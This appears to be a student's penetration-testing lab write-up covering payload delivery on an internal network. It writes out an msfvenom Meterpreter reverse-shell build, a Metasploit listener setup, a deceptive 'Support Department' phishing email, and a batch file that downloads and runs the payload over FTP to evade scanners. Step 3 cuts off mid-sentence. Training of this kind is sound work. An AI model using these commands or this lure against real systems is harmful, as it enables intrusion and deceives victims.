# Penetrating-an-Internal-Network


<h1>Phase 5</h1>


**<p style="font-size: 15px;">Step 1: Create a remote control payload.</p>**

I began this lab, as I have with many of the others, by elevating the Terminal window to use root privileges with the command "sudo su". Next, I went through the process of creating a new user, "adduser svcsupport". This new user account will be used as the credentials to download an exploit to the victim over FTP. Doing so will help to obfuscate, or hide, my identity if someone evaluates the malicious script. 

I then created a remote control payload with msfvenom, "msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 -f exe LHOST=203.0.113.66 LPORT=4444 -o /home/svcsupport/safetool.exe". Here is a breakdown of each part of the command, "-p" indicates the exploit to convert to shellcode, "--platform" sets the execution destination type (e.g., Windows), "-a" defines the platform architecture (e.g., x64), "-f" determines the output format (e.g., exe), "LHOST" sets the listening IP address for the receiving host, "LPORT" set the listening post number on the receiving host, and "-o" defines the output path and filename. 

Once the payload was created, I entered "ls -l /home/svcsupport" to confirm the existence of the exploit output file of safetool.exe. The file is displayed and is 7168 bytes in size. 

Next, I started the very secure FTP daemon with the command "service vsftpd start". Finally, I started the postgres with the command "service postgresql start". These services were previously downloaded to the lab and will be used to host the safetool.exe file, store the payload and deliver the exploit to the target system. 

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7f19a4b1-fcea-4695-9a44-f6f076cc5d7a)

**<p style="font-size: 15px;">Step 2: Setup the listener.</p>**

The listener must be set up to receive the inbound connection before the victim can be tricked into running the exploit payload. I began this phase by launching Metasploit utilizing the command "msfconsole". 

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/776669b2-337c-4d01-8876-66622f3405e6)

Next, I changed the MSF prompt to a handler for reverse shell payloads with the command "use exploit/multi/handler". As you can see, the following line shows (Using configured payload generic/shel_reverse_tcp). To show the configuration details of the handler I input "show options". As currently configured the LPORT is already set to 4444, the default listening port for metasploit. Additionally, there is not LHOST set and the payload is still set to the generic/shell_reverse_tcp. 

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8291d92-cd56-40f7-b7ee-794163bd0e35)

Below, I used the commands "set payload windows/x64/meterpreter/reverse_tcp" and "set LHOST 203.0.113.66" to update the configurations to reflect the payload I will utilize and the host. I re-entered the "show options" command to reveal the updates I made. Once the correct configuration was input, I initiated the MSFConsole as the listener by entering "run". The MSFConsole is now listening on the host 203.0.113.66 on port 4444 for any connections.

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/cc92f829-fd31-40ea-b41c-9d433a6a10aa)

**<p style="font-size: 15px;">Step 3: Socially engineer the victim.</p>**

To save time, this lab assumes that I have already crafted and sent a social engineering message to jaime@structureality.com with a batch file attachment, using the Social Engineering Toolkit (SET) as demonstrated in a previous lab. Later on I will create the batch file. 

In this step, I will operate as Jaime, the victim, who has been fooled by a social engineering email. The email had the following statement:

Dear Customer,

It has come to our attention that your accounts are outdated and need additional configuration to continue providing optimal services. Here is a tool that will automate the process of improving your configuration so you can continue to enjoy the full benefits of our services. 

Please run the attached file at your earliest convenience.

Note: The operation of the update may take considerable time. Minimize the Command Prompt window and continue using your system normally.  

Sincerely,
The Support Department 

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7bf68f95-ffd8-459b-bd48-98c878ab8ef8)

To create the batch file, I opened the command prompt and entered "notepad c:\Users\jaime\Downloads\trythis.bat". This command opened Notepad and created a new file in the specified directory.

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/735bbd9d-b7c4-4e4f-9556-e571d16902fa)

Notepad pops up, and I am asked if I would like to create the new file. I select, Yes.

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/c15b5d52-9417-4c60-b72d-b8bc93f2a1fd)

I then typed the following lines of code into Notepad:

"C:\Program Files (x86)\WinSCP\winscp" /ini=nul /command "open ftp://svcsupport:Pa$$w0rd@203.0.113.66/ -hostkey=open" "get safetool.exe %userprofile%\Downloads\" "exit"

"%userprofile%\Downloads\safetool.exe"

These commands facilitate the download and execution of the exploit file on the victim's system. The strategic use of a basic batch file is effective in circumventing malware scanners that may otherwise detect and remove the exploit from an email.

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/44a81139-5023-4440-aacb-15c752b6a1fe)

I saved the 

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7e793e40-644a-4982-8ca9-2a57a5981999)


![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8b53073-7666-4ce2-afcc-84719bd5b36b)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/3e7ce2ef-4d3f-43ae-8664-30071b9b8dc4)

**<p style="font-size: 15px;">Step 4: Take advantage of the exploited victim.</p>**

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/37cf91b5-5adb-4ae0-a427-c2af5a0783bc)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/091b0a44-cf32-4b50-a513-c98ef0322f37)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/50cb209c-8fe3-47f9-9a40-aac8d3c066b8)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/2b2eca48-9dcb-43ed-a626-fd7e6f0dac6d)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/f36ea8ca-fe63-44d6-80a8-644b278b9e51)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/78074d05-e177-4390-93f0-4740ae567606)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/9791e984-f45c-467a-b426-0f82afda102f)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/cc638e30-4482-4326-8b09-dda42f94c4ad)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/7a08a906-5ba2-4ebe-97d6-da5abc5b8732)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/8db7738a-717f-479a-8b39-eb0f1aba1d90)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/ed720de7-11ac-4953-9b90-672bcc506bac)

![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/ca7101f7-04b9-42e0-bc49-1d75240ed48f)







